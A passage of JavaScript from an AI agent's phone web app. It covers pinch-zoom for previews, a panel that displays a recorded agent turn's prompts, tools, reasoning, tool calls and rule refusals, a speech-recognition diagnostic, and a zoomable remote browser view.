    setTimeout(() => { if (previewLastTap === now) closePreview(); }, PREVIEW_TAP_MS);
  }
}

// iOS pinch. Safari does NOT hand a two-finger pinch over as two clean
// pointer streams — it claims the gesture as page zoom and reports it through
// WebKit's own gesturestart/gesturechange/gestureend, whose `scale` is the
// spread relative to the start of the gesture. So the pointer-pair path above
// (which is what Chrome and Android give) is not enough on the one device this
// feature exists for, and pinching there did nothing at all.
//
// preventDefault is half the point: without it Safari zooms the PAGE, leaving
// the app itself scaled up with no way back inside a standalone PWA.
let previewGestureFrom = null;

function previewGestureStart(event) {
  const box = previewBox();
  if (!box) return;
  event.preventDefault();
  previewGestureFrom = {
    state: previewState,
    // Where the fingers landed. gesturechange reports the CURRENT midpoint as
    // clientX/clientY, so the pair's travel is carried the same way as above.
    from: previewPoint(event, box.rect),
  };
}

function previewGestureChange(event) {
  const box = previewBox();
  if (!box || !previewGestureFrom) return;
  event.preventDefault();
  previewState = previewPinch(
    previewGestureFrom.state, event.scale || 1,
    previewGestureFrom.from, previewPoint(event, box.rect), box.view, box.natural,
  );
  previewPaint(false);
}

function previewGestureEnd(event) {
  if (event.preventDefault) event.preventDefault();
  previewGestureFrom = null;
  previewSnapshot();
  // A pinch that ended below fit springs back to it, the way letting go of an
  // over-pinched photo does everywhere else.
  const box = previewBox();
  if (box && previewState.scale <= 1.01) {
    previewState = { scale: 1, x: 0, y: 0 };
    previewPaint(true);
  }
}

function previewWheel(event) {
  const box = previewBox();
  if (!box) return;
  event.preventDefault();
  const scale = previewState.scale * (event.deltaY < 0 ? 1.15 : 1 / 1.15);
  previewState = previewZoomAt(
    previewState, scale, previewPoint(event, box.rect), box.view, box.natural,
  );
  previewPaint(false);
}

// A file name a chip cannot show in full, shortened from the MIDDLE. The end of
// a name is where it differs — IMG_4021 vs IMG_4022, "-final" vs "-final-2",
// and the extension — so a plain trailing ellipsis cuts off exactly what tells
// two files apart, which is what "the names are cut so I can't distinguish
// some of them" was about.
const NAME_MAX = 30;

function shortName(name, max = NAME_MAX) {
  name = String(name || "");
  if (name.length <= max) return name;
  const head = Math.ceil((max - 1) * 0.45);
  const tail = max - 1 - head;
  return `${name.slice(0, head)}…${name.slice(-tail)}`;
}


// ---- the dossier ---------------------------------------------------------
//
// [EXPLAIN-START]
// One turn, read back from /explain: what it was given, what it was thinking,
// what it ran, what it produced. The panel exists because the answer to "why
// did it do that" is usually "it was not given what you think it was", and
// that evidence is recorded but was reachable only from a terminal.
//
// EVERY string here is set as TEXT, never as markup. Reasoning quotes fetched
// pages, file contents and mail bodies — this panel renders the untrusted half
// of the machine, and the one place it must not be rendered is as HTML.
//
// Nothing from here is cached: the response is `no-store` and the service
// worker passes /explain through (NEVER_CACHE), so the bodies never reach the
// device's disk the way transcript events do.
let xpAbort = null;   // in-flight fetch, so a second open cancels the first

function xpEl(tag, cls, text) {
  const node = document.createElement(tag);
  if (cls) node.className = cls;
  if (text !== undefined && text !== null) node.textContent = String(text);
  return node;
}

// The three states, on screen. A blank is what lets someone read "it was told
// nothing" off a log that predates the record, or off bytes deliberately
// purged, so each says which one it is.
const XP_STATE_WORDS = {
  not_recorded: "not recorded — the aish that wrote this log did not keep it",
  empty: "recorded, and there was none",
  purged: "recorded, then deleted",
  unreadable: "recorded, but the stored bytes are unreadable",
  fragments: "only a fragment was kept — this log predates the full record",
};

function xpState(state, into) {
  const word = XP_STATE_WORDS[state];
  if (word) into.appendChild(xpEl("p", "xp-state", word));
  return !word;   // true when the state is `recorded` and there is content
}

function xpSection(title, summary, fill) {
  const wrap = xpEl("section", "xp-sec");
  const head = xpEl("button", "xp-sechead");
  head.type = "button";
  head.appendChild(xpEl("span", "xp-secname", title));
  head.appendChild(xpEl("span", "xp-secsum", summary));
  head.appendChild(xpEl("span", "xp-chev", "›"));
  const body = xpEl("div", "xp-secbody");
  let filled = false;
  head.onclick = () => {
    // Built on first open, not on render: a turn's system text alone is tens of
    // thousands of characters, and four sections of it laid out up front is a
    // panel that takes a visible beat to appear.
    if (!filled) { filled = true; fill(body); }
    wrap.classList.toggle("open");
  };
  wrap.append(head, body);
  return wrap;
}

function xpRow(into, label, value) {
  const row = xpEl("div", "xp-row");
  row.appendChild(xpEl("span", "xp-key", label));
  row.appendChild(xpEl("span", "xp-val", value));
  into.appendChild(row);
}

// A long body (reasoning, a page a tool read, the system prompt) folded to a
// few lines with the rest one tap away. Not truncated — the whole point of the
// record is that it is whole; only the first look is short.
function xpLong(into, text, lines = 6) {
  const all = String(text || "");
  const pre = xpEl("pre", "xp-pre", all);
  const split = all.split("\n");
  if (split.length > lines || all.length > 600) {
    pre.classList.add("xp-clamped");
    const more = xpEl("button", "xp-more", `show all (${all.length} characters)`);
    more.type = "button";
    more.onclick = () => {
      pre.classList.remove("xp-clamped");
      more.remove();
    };
    into.append(pre, more);
  } else {
    into.appendChild(pre);
  }
}

function xpGiven(doc, into) {
  const given = doc.given;
  if (!given.briefs.length) xpState(given.state, into);
  for (const brief of given.briefs) {
    const options = brief.options || {};
    // A brief is written only when what the model was handed CHANGES, so most
    // turns are shown the one still in force. That is a different fact from one
    // written here, and collapsing them would let a reader conclude the tools
    // changed at this turn when the record only says they had not changed since.
    if (!brief.written_here) {
      into.appendChild(xpEl("p", "xp-state",
        `unchanged since turn ${brief.in_force_since} — this is what was still in force`));
    }
    xpRow(into, "model", `${options.model} · context ${options.num_ctx} · thinking ${options.think ? "on" : "off"}`);
    if (options.system_role === "first_only") {
      into.appendChild(xpEl("p", "xp-warn",
        `on ${options.provider} the per-task reminder — which carries the rules in force — `
        + "reached the model as one of your own messages, not as a system instruction"));
    }
    const sys = xpEl("div", "xp-sub");
    sys.appendChild(xpEl("h4", null, "What it was told"));
    if (xpState(brief.system.state, sys)) {
      for (const part of brief.system.parts) {
        const box = xpEl("div", "xp-part");
        box.appendChild(xpEl("h5", null, `message ${part.at} · ${part.chars} characters`));
        if (xpState(part.state, box)) xpLong(box, part.text);
        sys.appendChild(box);
      }
    }
    into.appendChild(sys);

    const menu = xpEl("div", "xp-sub");
    menu.appendChild(xpEl("h4", null, `Tools it could use (${brief.tools.count})`));
    if (xpState(brief.tools.state, menu)) {
      const search = xpEl("input", "xp-search");
      search.type = "search";
      search.placeholder = "Search tools";
      const list = xpEl("div", "xp-tools");
      const entries = brief.tools.entries || [];
      const draw = (needle) => {
        list.textContent = "";
        for (const entry of entries) {
          const fn = entry.function || {};
          const name = String(fn.name || "");
          const desc = String(fn.description || "");
          if (needle && !(name + " " + desc).toLowerCase().includes(needle)) continue;
          const item = xpEl("div", "xp-tool");
          item.appendChild(xpEl("code", null, name));
          item.appendChild(xpEl("p", null, desc));
          list.appendChild(item);
        }
        if (!list.children.length) list.appendChild(xpEl("p", "xp-state", "no tool matches that"));
      };
      if (entries.length) {
        search.oninput = () => draw(search.value.trim().toLowerCase());
        draw("");
        menu.append(search, list);
      } else {
        // Names without descriptions: the record has them, the bytes are gone.
        menu.appendChild(xpEl("p", "xp-val", (brief.tools.names || []).join(", ")));
      }
    }
    into.appendChild(menu);
  }

  for (const record of given.context.records || []) {
    const preload = record.preload || {};
    xpRow(into, "knowledge",
      `${((record.index || {}).items || []).length} offered, ${preload.count || 0} injected`
      + (preload.names && preload.names.length ? ` — ${preload.names.join(", ")}` : ""));
  }
  const rules = given.rules || {};
  const bound = ((rules.groups || {}).bind) || [];
  const abstained = ((rules.groups || {}).abstain) || [];
  if (rules.state === "recorded") {
    xpRow(into, "rules", `${bound.length} in force, ${abstained.length} evaluated and not applied`);
    for (const row of bound) {
      const item = xpEl("div", "xp-part");
      item.appendChild(xpEl("h5", null, String(row.rule || "")));
      for (const ob of (row.binding || {}).obligations || []) {
        item.appendChild(xpEl("pre", "xp-pre", JSON.stringify(ob)));
      }
      into.appendChild(item);
    }
  }
  for (const note of doc.steering || []) {
    xpRow(into, "you typed", note.text);
  }
}

// How the round grouping was arrived at. `recorded` needs no words; the other
// two do, because a reader must never be shown an inference wearing a record's
// clothes.
const XP_GROUPING_WORDS = {
  inferred: "round order inferred from the order the log was written — this log predates the by-id record",
  none: "this backend's loop records no model calls, so this turn cannot be shown as rounds",
};

// The turn in the order it happened. Sectioning by record kind could not answer
// "what did it think after it got that result", which is the question people
// open a dossier to ask — so the thought, the calls it issued and the results
// they returned sit together, round by round.
//
// The SKELETON is open and the bodies are folded: the skeleton IS the flow, and
// if reading it costs a tap per round the reorganisation bought nothing.
function xpFlow(doc, into) {
  const flow = doc.flow || { grouping: "none", rounds: [], unplaced: [], loose: [] };
  // Whether the reasoning is here at all — said once, at the top, rather than
  // once per round. A log written before the full record kept only a rendered
  // fragment, and a snippet shown as "the reasoning" is how someone concludes
  // the model barely thought about it.
  if (doc.thought.state === "fragments") {
    xpState("fragments", into);
    for (const gist of doc.thought.fragments || []) into.appendChild(xpEl("pre", "xp-pre", gist));
  } else if (doc.thought.state !== "recorded") {
    xpState(doc.thought.state, into);
  }
  const word = XP_GROUPING_WORDS[flow.grouping];
  if (word) into.appendChild(xpEl("p", "xp-state", word));
  const thoughts = new Map((doc.thought.calls || []).map((t) => [t.model_call, t]));
  const calls = new Map((doc.did.calls || []).map((c) => [c.call, c]));

  for (const round of flow.rounds) {
    for (const event of round.before || []) xpEvent(event, true, into);
    const box = xpEl("div", "xp-round");
    const thought = thoughts.get(round.thought);
    let head = `Round ${round.model_call}`;
    if (thought && thought.tokens && thought.tokens.length) {
      head += ` · ${thought.tokens[0]} in, ${thought.tokens[1]} out`;
    }
    if (thought && thought.stop && thought.stop !== "stop") head += ` · ${thought.stop}`;
    box.appendChild(xpEl("h5", null, head));
    if (!thought) {
      box.appendChild(xpEl("p", "xp-state", "no response was recorded for this call"));
    } else {
      if (thought.synthesized) {
        box.appendChild(xpEl("p", "xp-warn",
          "the text below is aish's own sentence, not the model's"));
      }
      if (thought.text) xpLong(box, thought.text, 6);
      else box.appendChild(xpEl("p", "xp-state", "this call recorded no thinking"));
      if (thought.truncated) {
        box.appendChild(xpEl("p", "xp-warn",
          `${thought.truncated} characters were cut from this record by ${thought.cap_source || "a cap"}`));
      }
      if (thought.said) {
        box.appendChild(xpEl("h6", null, "said alongside the call"));
        xpLong(box, thought.said, 4);
      }
      if (thought.malformed && thought.malformed.length) {
        box.appendChild(xpEl("p", "xp-warn",
          "arguments did not parse for: " + thought.malformed.join(", ")));
      }
    }
    for (const number of round.calls || []) {
      const call = calls.get(number);
      if (call) box.appendChild(xpCall(call));
    }
    if (thought && !(round.calls || []).length) {
      box.appendChild(xpEl("p", "xp-state", "no tool calls ran under this one"));
    }
    box.dataset.round = String(round.model_call);
    into.appendChild(box);
  }

  if ((flow.unplaced || []).length) {
    into.appendChild(xpEl("h5", null, "calls that name no model call"));
    for (const number of flow.unplaced) {
      const call = calls.get(number);
      if (call) into.appendChild(xpCall(call));
    }
  }
  for (const event of flow.loose || []) xpEvent(event, false, into);
  if (!flow.rounds.length && !(flow.unplaced || []).length) {
    into.appendChild(xpEl("p", "xp-state", "nothing was recorded for this turn"));
  }
}

// Something that happened BETWEEN two thoughts — the "what changed while it was
// running" facts a kind-sliced dossier hid. `placed` is false when no round
// could be named: the event still shows, without a claim about when.
function xpEvent(event, placed, into) {
  const when = placed ? "before this call" : "at some point in this turn";
  if (event.kind === "trim") {
    const record = event.record || {};
    const stubbed = (record.stubbed || []).map((s) => `${s.tool} (#${s.at})`).join(", ");
    into.appendChild(xpEl("p", "xp-event",
      `⚠ ${when}, ${record.affected} earlier result(s) were replaced with a stub for the model`
      + (stubbed ? `: ${stubbed}` : " — which ones was not recorded")));
  } else if (event.kind === "steering") {
    into.appendChild(xpEl("p", "xp-event", `⚠ you typed ${when}: ${event.text}`));
  } else if (event.kind === "brief_changed") {
    into.appendChild(xpEl("p", "xp-event", `⚠ ${when}, what the model was handed changed`));
  }
}

function xpCall(call) {
  const box = xpEl("div", "xp-call");
  box.dataset.call = String(call.call);
  const head = xpEl("h6", null, `→ ${call.name}`);
  if (!call.completed) head.appendChild(xpEl("span", "xp-bad", " never completed"));
  else if (!call.ok) head.appendChild(xpEl("span", "xp-bad", ` failed (${call.status})`));
  else if (call.summary) head.appendChild(xpEl("span", "xp-dim", ` ${call.summary}`));
  box.appendChild(head);
  if (call.args_state === "recorded") xpLong(box, JSON.stringify(call.args, null, 1), 4);
  else xpState("not_recorded", box);
  if (call.args_truncated) {
    box.appendChild(xpEl("p", "xp-warn",
      `${call.args_truncated} characters of these arguments were cut from the record`));
  }
  for (const gate of call.refused || []) {
    box.appendChild(xpEl("p", "xp-warn",
      `refused by ${gate.rule || gate.at}${gate.why ? ` — ${gate.why}` : ""}`));
  }
  if (call.error) box.appendChild(xpEl("p", "xp-bad", call.error));
  if (call.output) {
    box.appendChild(xpEl("h6", null, "what came back"));
    xpLong(box, call.output, 6);
  }
  return box;
}

function xpFlowSummary(doc) {
  const flow = doc.flow || { rounds: [], unplaced: [] };
  const rounds = flow.rounds.length;
  const calls = (doc.did.calls || []).length;
  if (!rounds && !calls) return "not recorded";
  const bad = (doc.did.calls || []).filter((c) => !c.ok || !c.completed).length;
  return `${rounds} round${rounds === 1 ? "" : "s"} · ${calls} call${calls === 1 ? "" : "s"}`
    + (bad ? ` · ${bad} failed` : "");
}

function xpProduced(doc, into) {
  const produced = doc.produced;
  if (produced.answer) xpLong(into, produced.answer, 10);
  else into.appendChild(xpEl("p", "xp-state", "no answer was recorded for this turn"));
  const verify = produced.verify || {};
  for (const gate of verify.stopped || []) {
    into.appendChild(xpEl("p", "xp-warn", `held by ${gate.rule || "a check"}`));
  }
  for (const gate of verify.advised || []) {
    into.appendChild(xpEl("p", "xp-val", `delivered with a note from ${gate.rule || "a check"}`));
  }
  if (verify.passed) into.appendChild(xpEl("p", "xp-state", `${verify.passed} check(s) passed`));
  if (produced.status && produced.status !== "ok") {
    into.appendChild(xpEl("p", "xp-bad", `the task ended ${produced.status}: ${produced.error}`));
  }
}

// Facts about this turn worth reading first — computed in Python over the same
// document, so this is a renderer and never a second opinion. Rows state what
// happened and where it came from; none of them says WHY.
function xpNotes(doc, into) {
  const notes = doc.notes || { rows: [], checks: [] };
  const box = xpEl("section", "xp-notes");
  box.appendChild(xpEl("h4", null, "Worth a look"));
  if (!notes.rows.length) {
    // NOT "nothing unusual": a checker knows only the classes someone coded,
    // so on the one turn whose cause is an uncoded class that sentence would
    // state the opposite of the truth, above the evidence.
    box.appendChild(xpEl("p", "xp-state",
      `nothing flagged by the ${notes.checks.length} checks this reader runs`));
  }
  for (const row of notes.rows) {
    const item = xpEl("button", "xp-note", row.text);
    item.type = "button";
    item.onclick = () => xpJump(row.where);
    box.appendChild(item);
  }
  into.appendChild(box);
}

// Put `el` at the top of the panel's own scroller.
//
// NOT scrollIntoView. That scrolls every scrollable ancestor — including the
// transcript behind the sheet — and its smooth behaviour turns a long jump into
// an animation that races whatever the reader does next; measured, a jump of
// 8000px had not arrived a second and a half later, which reads as a dead
// control. Setting scrollTop on the one scroller that owns this content is
// deterministic and instant, which is what navigating inside a panel should be.
function xpScrollTo(el) {
  const body = $("xp-body");
  if (!body || !el) return;
  // offsetTop accumulation, NOT getBoundingClientRect. A rect is measured
  // against the viewport, so turning it into a content offset needs
  // `+ scrollTop` — and that term makes the answer depend on the layout being
  // settled at the instant of measurement. Measured on a real turn: a round
  // whose true offset was 10812 read as 361 while the section that had just
  // been filled was still being laid out, so the panel scrolled 355px and the
  // reader landed in the middle of the wrong section. offsetTop is
  // scroll-independent, so there is no term to be stale.
  let top = 0;
  for (let node = el; node && node !== body; node = node.offsetParent) top += node.offsetTop;
  body.scrollTop = Math.max(0, top - 6);
}

// A note is a shortcut INTO the evidence, so it opens the section AND lands on
// the exact round or call it was computed from. Landing at the top of a long
// stream makes the citation decorative.
function xpJump(where) {
  where = where || {};
  const target = document.querySelector(`.xp-sec[data-sec="${where.section}"]`);
  if (!target) return;
  if (!target.classList.contains("open")) target.querySelector(".xp-sechead").click();
  let inner = null;
  if (where.call !== undefined) {
    inner = target.querySelector(`.xp-call[data-call="${where.call}"]`);
  } else if (where.model_call !== undefined) {
    inner = target.querySelector(`.xp-round[data-round="${where.model_call}"]`);
  }
  const landing = inner || target;
  xpScrollTo(landing);
  // …and again once the browser has laid the new section out. Filling a section
  // adds thousands of pixels above the landing spot, and the first pass can
  // measure before that settles; a second pass on the next frame is cheap and
  // makes the jump land whether or not it did.
  requestAnimationFrame(() => xpScrollTo(landing));
}

function xpRender(doc) {
  const body = $("xp-body");
  body.textContent = "";
  $("xp-title").textContent = "Full record";

  const head = xpEl("header", "xp-head");
  head.appendChild(xpEl("p", "xp-prompt", doc.prompt || "(no prompt recorded)"));
  const options = ((doc.given.briefs[0] || {}).options) || {};
  const bits = [options.model, doc.ts].filter(Boolean);
  head.appendChild(xpEl("p", "xp-meta", bits.join(" · ")));
  if (doc.running) {
    head.appendChild(xpEl("p", "xp-warn",
      "this turn is still running — showing what has been recorded so far"));
  }
  body.appendChild(head);

  xpNotes(doc, body);

  // Three parts, in the shape a turn actually has. Sectioning by record kind is
  // how a FILE is organised, and it left the reader unable to tell which
  // thinking followed which result.
  const sections = [
    ["given", "Before it started", xpGivenSummary(doc), (into) => xpGiven(doc, into)],
    ["flow", "What happened", xpFlowSummary(doc), (into) => xpFlow(doc, into)],
    ["produced", "What it answered", xpProducedSummary(doc), (into) => xpProduced(doc, into)],
  ];
  for (const [key, title, summary, fill] of sections) {
    const section = xpSection(title, summary, fill);
    section.dataset.sec = key;
    body.appendChild(section);
  }
}

function xpGivenSummary(doc) {
  const brief = doc.given.briefs[0];
  if (!brief) return "not recorded";
  const rules = ((doc.given.rules || {}).groups || {}).bind || [];
  return `${brief.tools.count} tools · ${rules.length} rules`;
}

function xpProducedSummary(doc) {
  const produced = doc.produced;
  if (produced.status && produced.status !== "ok") return `ended ${produced.status}`;
  const held = (produced.verify || {}).stopped || [];
  return held.length ? `${held.length} check(s) held it` : "answered";
}

// [EXPLAIN-OPEN-START]
// The one entry point. `ref` is the #202 string turn id, or empty for the
// session's LAST turn — never a client-counted ordinal, because the first paint
// is bounded and a browser's fourth turn is not the log's fourth on a long chat
// ([FORK-ANCHOR]'s lesson: an id cannot be counted wrong).
async function openExplain(ref) {
  if (!currentSession) return;
  if (xpAbort) xpAbort.abort();
  xpAbort = new AbortController();
  openSheet("explain-sheet");
  const body = $("xp-body");
  body.textContent = "";
  $("xp-title").textContent = "Full record";
  body.appendChild(xpEl("p", "xp-state", "reading the record…"));
  const url = new URL(BASE + "explain", location.href);
  url.searchParams.set("session", currentSession);
  if (ref) url.searchParams.set("turn", ref);
  if (token) url.searchParams.set("token", token);
  try {
    const response = await fetch(url.toString(), { cache: "no-store", signal: xpAbort.signal });
    if (!response.ok) {
      // A screen that cannot show the truth SAYS so (L7) rather than leaving
      // the spinner up. Offline is the common case here: the transcript paints
      // from the mirror, so the door is visible when the fetch cannot work.
      body.textContent = "";
      body.appendChild(xpEl("p", "xp-state",
        response.status === 404
          ? "there is no record of that turn in this chat's log"
          : `the record could not be read (${response.status})`));
      return;
    }
    xpRender(await response.json());
  } catch (err) {
    if (err && err.name === "AbortError") return;
    body.textContent = "";
    body.appendChild(xpEl("p", "xp-state",
      "the record could not be read — this device may be offline"));
  }
}
// [EXPLAIN-OPEN-END]
// [EXPLAIN-END]

// ---- sheets --------------------------------------------------------------
function openSheet(id) {
  for (const sheet of document.querySelectorAll(".sheet")) sheet.hidden = true;
  $(id).hidden = false;
  $("backdrop").hidden = false;
}

// ---- mic / speech-recognition diagnostic (/mic) --------------------------
// A throwaway probe for whether webkitSpeechRecognition actually works in THIS
// runtime — crucially, when opened inside the installed PWA (standalone), where
// iOS has historically broken it. Shows support, the run context, live interim
// + final transcript, and every recognition event, with an en/pl language
// switch so both languages can be checked. Gates the Car Mode feature (#97).
const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
let micRec = null;
let micLang = "en-US";
let micListening = false;

function micLogLine(msg) {
  const log = $("mic-log");
  const t = new Date().toLocaleTimeString([], { hour12: false }) +
    "." + String(Date.now() % 1000).padStart(3, "0");
  log.textContent += `${t}  ${msg}\n`;
  log.scrollTop = log.scrollHeight;
}

function micContext() {
  const standalone = window.matchMedia("(display-mode: standalone)").matches ||
    window.navigator.standalone === true;
  const support = SpeechRec
    ? '<span class="ok">SpeechRecognition: supported</span>'
    : '<span class="bad">SpeechRecognition: NOT available</span>';
  const ctx = standalone
    ? '<span class="ok">running in: installed PWA (standalone)</span>'
    : "running in: browser tab";
  $("mic-support").innerHTML = `${support}<br>${ctx}`;
}

// ---- remote browser view -------------------------------------------------
// The Mac runs headless, so the on-screen login window is unreachable in
// practice. This drives aish's OWN browser from the PWA: a frame arrives, a
// tap becomes a click at the same coordinates, and the next frame comes back.
//
// PIXELS, NOT A PROXY, and that is a security property as much as a rendering
// one: the site's HTML never enters this document, so nothing it contains can
// script this page or reach the session token. The <img> is the entire
// attack surface.
//
// Nothing typed here is logged anywhere — the owner puts real passwords
// through it.
let bvFrame = { width: 1024, height: 1400 };
let bvBusy = false;

// [BROWSER-VIEW-ZOOM-START]
// Zoom exists for one job: hitting a small field — a password box on a phone —
// accurately. So a drag PANS and never dismisses (unlike the photo lightbox,
// where drag-down closes), and a press that did not move is still a click on
// the page. The frame is captured at 2x, so zooming in stays sharp rather
// than showing an enlarged blur.
const BV_MAX_ZOOM = 4;
const BV_TAP_SLOP = 8;           // px of movement still counted as a tap
// A tap waits this long to see whether it is half of a double-tap. The old
// code sent the click immediately, arguing a 300ms wait "would make the view
// feel broken" and a stray click "costs a frame, not data". Both halves were
// wrong here: the round trip is already 1-3s so 300ms is imperceptible, and a
// stray click follows links, toggles controls and focuses fields — page state
// that costs a round trip to discover and may be unrecoverable mid-login. It
// is also what made double-tap-to-zoom useless: the first tap clicked the
// page, so the page changed under the zoom.
// 300ms is the platform's own number — mobile browsers used exactly this delay
// because the viewport was double-tap-zoomable. This is a zoomable viewport.
const BV_DOUBLE_TAP_MS = 300;
let bvTapTimer = null;
let bvZoom = { scale: 1, x: 0, y: 0 };
const bvPointers = new Map();
let bvDragFrom = null;           // {x, y, zoom, moved} while one finger is down
let bvPinchFrom = null;          // {dist, scale} while two are
let bvLastTapAt = 0;

/** Keep the picture over the stage: at 1x it is centred and immovable, and
 *  zoomed in it can never be panned so far that the page is off screen. The
 *  ONE writer of the transform clamps, so an out-of-bounds pan is unwritable
 *  rather than merely unwritten. */
function bvClamp(zoom, stage) {
  const scale = Math.max(1, Math.min(BV_MAX_ZOOM, zoom.scale));
  const slackX = Math.max(0, (stage.width * scale - stage.width) / 2);
  const slackY = Math.max(0, (stage.height * scale - stage.height) / 2);
  return {
    scale,
    x: Math.max(-slackX, Math.min(slackX, zoom.x)),
    y: Math.max(-slackY, Math.min(slackY, zoom.y)),
  };
}

function bvPaint(settle) {
  const img = $("bv-frame");
  const stage = img.parentElement.getBoundingClientRect();
  bvZoom = bvClamp(bvZoom, { width: stage.width, height: stage.height });
  img.classList.toggle("settling", !!settle);
  // translate BEFORE scale: the transform is read back through the element's
  // bounding box by [BROWSER-VIEW-COORDS-START], which needs a uniform scale
  // it can invert.
  img.style.transform =
    `translate(${bvZoom.x}px, ${bvZoom.y}px) scale(${bvZoom.scale})`;
  bvShowZoom();
  bvPaintDetail();   // rides the same transform, so it moves with the picture
  // The outline is positioned from the image's CURRENT geometry, so it has to
  // be redrawn whenever that geometry moves. Painting it only when a frame
  // arrived left it pinned to where the field used to be the moment anything
  // was zoomed or panned — which is exactly when an outline matters most,
  // because zoom is what you reach for to hit a small field.
  bvPaintFocus(bvFocusRect);
}

/** Announce the zoom level WITHOUT inventing a control.
 *
 *  The old "1:1" button merged the two: he read a badge sitting on the content
 *  as a status readout and never pressed it. In this category they are never
 *  the same element — a readout is transient and untappable (a PDF viewer's
 *  fading "150%"), a control is a labelled verb in the chrome. Double-tap is
 *  the reset, which is the convention and exactly what he asked for. */
let bvZoomPillTimer = null;
function bvShowZoom() {
  const pill = $("bv-zoom");
  if (!pill) return;
  if (bvZoom.scale === 1) { pill.hidden = true; return; }
  pill.textContent = `${bvZoom.scale.toFixed(1)}×`;
  pill.hidden = false;
  clearTimeout(bvZoomPillTimer);
  bvZoomPillTimer = setTimeout(() => { pill.hidden = true; }, 900);
}

/** A dot where the tap landed, painted at once. The click itself is 300ms +
 *  a round trip away, and it also shows WHERE the tap mapped — which is the
 *  aiming problem zoom exists for. */
function bvMarkTap(clientX, clientY) {
  const mark = $("bv-tap");
  const stage = $("bv-frame").parentElement.getBoundingClientRect();
  if (!mark) return;
  mark.style.left = `${clientX - stage.left}px`;
  mark.style.top = `${clientY - stage.top}px`;
  mark.hidden = false;
  mark.classList.remove("ping");
  void mark.offsetWidth;               // restart the animation
  mark.classList.add("ping");
}

function bvZoomAt(scale, clientX, clientY) {
  // Zoom about the point under the finger, so the thing being aimed at stays
  // put instead of sliding out from under it.
  const img = $("bv-frame");
  const box = img.getBoundingClientRect();
  const cx = clientX - (box.left + box.width / 2);
  const cy = clientY - (box.top + box.height / 2);
  const factor = scale / bvZoom.scale;
  bvZoom = {
    scale,
    x: bvZoom.x - cx * (factor - 1),
    y: bvZoom.y - cy * (factor - 1),
  };
  bvPaint(true);
}

/** Screen pixels -> page pixels. The frame is drawn `contain`-fitted, so a
 *  finger travelling 100px across a shrunken frame is more than 100px of page.
 *  Same geometry the tap mapper inverts, so a swipe moves what it looks like
 *  it moves. */
function bvPageScale() {
  const box = $("bv-frame").getBoundingClientRect();
  const scale = Math.min(box.width / bvFrame.width, box.height / bvFrame.height);
  return scale > 0 ? 1 / scale : 1;
}

function bvResetZoom() {
  bvZoom = { scale: 1, x: 0, y: 0 };
  bvClearDetail();   // back to fit: the frame's own pixels are enough again
  bvPaint(true);
}
// [BROWSER-VIEW-ZOOM-END]

// [BROWSER-VIEW-DETAIL-START]
// A frame is an OVERVIEW, and it is sharp only up to `zoom == its density`.
// Past that the phone is magnifying a JPEG, which is what the owner met at 2.5x
// and above. No density fixes it: zoom goes to 4x, so serving it from the frame
// would mean a 1.3 MB capture on every glance and scroll to serve the one
// moment he stops and reads. So the deep end is fetched for the rectangle he is
// actually looking at, and that gets CHEAPER the further in he goes — the
// region shrinks as fast as the scale grows, so a patch is always about one
// screenful (90 KB at 4x). Detail is O(screen); density is O(page).
//
// A trip is still a trip, so it is spent only when he has STOPPED moving, only
// when the frame genuinely cannot show what he is asking for, and never twice
// for ground already covered.
const BV_DETAIL_SETTLE_MS = 260;   // a gesture is over, not merely paused
const BV_DETAIL_MARGIN = 1.15;     // how far past the frame's own density is worth a trip
const BV_DETAIL_PAD = 1.25;        // capture wider than the screen so small pans stay sharp
let bvDetail = null;               // {x, y, w, h, scale} of the patch on screen
let bvDetailTimer = null;
let bvFrameSeq = 0;                // bumped by every frame: a patch older than it is stale

/** The page rectangle currently on screen, in the CSS pixels a tap maps into.
 *
 *  Read from the LIVE geometry rather than from `bvZoom`, for the same reason
 *  `browserViewPoint` does: the browser has already applied the transform, so
 *  inverting one uniform scale cannot drift out of step with it. Clamped to the
 *  page rather than refused at the edges — a rounding error should cost a few
 *  pixels of coverage, not the capture. */
function bvVisiblePageRect() {
  const img = $("bv-frame");
  if (!img || !bvFrame.width || !bvFrame.height) return null;
  const stage = img.parentElement.getBoundingClientRect();
  const box = img.getBoundingClientRect();       // transform already applied
  const shown = Math.min(box.width / bvFrame.width, box.height / bvFrame.height);
  if (!(shown > 0)) return null;
  const originX = box.left + (box.width - bvFrame.width * shown) / 2;
  const originY = box.top + (box.height - bvFrame.height * shown) / 2;
  const x0 = Math.max(0, (stage.left - originX) / shown);
  const y0 = Math.max(0, (stage.top - originY) / shown);
  const x1 = Math.min(bvFrame.width, (stage.right - originX) / shown);
  const y1 = Math.min(bvFrame.height, (stage.bottom - originY) / shown);
  if (x1 <= x0 || y1 <= y0) return null;
  // `shown` is screen CSS px per page CSS px; the SCREEN's own pixels are what
  // decide how much resolution is worth having.
  return { x: x0, y: y0, w: x1 - x0, h: y1 - y0,
           need: shown * (window.devicePixelRatio || 1) };
}

/** How many image pixels the frame carries per page CSS pixel — read off the
 *  picture itself, so the client never holds a copy of the server's density
 *  that could fall out of step with it. */
function bvFrameDensity() {
  const img = $("bv-frame");
  if (!img || !img.naturalWidth || !bvFrame.width) return 0;
  return img.naturalWidth / bvFrame.width;
}

function bvDetailCovers(rect) {
  const d = bvDetail;
  return !!d && rect.x >= d.x && rect.y >= d.y &&
    rect.x + rect.w <= d.x + d.w && rect.y + rect.h <= d.y + d.h &&
    rect.need <= d.scale * 1.05;
}

/** Drop the patch. Anything that could have changed the page calls this: a
 *  sharp rectangle of a page that has moved on is worse than a blurry one of
 *  the page in front of him, because it looks authoritative. */
function bvClearDetail() {
  bvDetail = null;
  clearTimeout(bvDetailTimer);
  const layer = $("bv-detail-layer");
  if (layer) layer.hidden = true;
}

function bvScheduleDetail() {
  clearTimeout(bvDetailTimer);
  bvDetailTimer = setTimeout(bvRequestDetail, BV_DETAIL_SETTLE_MS);
}

function bvRequestDetail() {
  // The SECOND of the two callers of `bvMayTouchPage`, and the reason the rule
  // is a function rather than a line inside `bvSend`: this one deliberately
  // bypasses that guard (below), so it would have bypassed the read-only rule
  // with it. A watch frame is captured at the browse context's own density
  // (1x, docs/browser.md) and there is no clip-recapture for it, so there is
  // nothing to sharpen here besides.
  if ($("browser-sheet").hidden || !bvOpen || !bvMayTouchPage()) return;
  const rect = bvVisiblePageRect();
  const density = bvFrameDensity();
  if (!rect || !density) return;
  // The frame can already show this. Zooming within what it carries is what
  // "zoom is free" means, and spending a round trip on it would make the view
  // chattier than the picture is better.
  if (rect.need <= density * BV_DETAIL_MARGIN) { bvClearDetail(); return; }
